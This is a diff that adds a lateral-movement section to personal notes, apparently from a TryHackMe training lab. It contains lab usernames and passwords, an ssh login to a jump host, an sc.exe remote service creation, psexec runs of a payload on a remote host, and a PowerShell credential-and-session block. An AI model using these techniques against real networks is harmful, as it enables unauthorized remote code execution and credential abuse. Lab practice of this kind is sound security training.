@@ -43,3 +43,26 @@
   - sysmon enable / powershell loggging enabled ?
 - echo %VARIABLE%
 
+
+# Lateral Movement
+arthur.campbell:Pksp9395
+
+$ ssh za.tryhackme.com\\arthur.campbell:@thmjmp2.za.tryhackme.com
+
+
+sc.exe \\thmiis.za.tryhackme.com create THMservice-3244 binPath= "%windir%\pat.exe" start=auto
+THM{MOVING_WITH_SERVICES}
+
+\\thmiis.za.tryhackme.com 
+
+psexec64.exe \\thmiis.za.tryhackme.com -u ZA.TRYHACKME.COM\t1_leonard.summers -p EZpass4ever -i %windir%\pat.exe
+
+psexec64.exe \\thmiis.za.tryhackme.com -u t1_leonard.summers -i %windir%\pat.exe
+
+===
+$username = 'ZA.TRYHACKME.COM\t1_leonard.summers';
+$password = 'EZpass4ever';
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
+
+Enter-PSSession -Computername \\thmiis.za.tryhackme.com -Credential $credentialwho
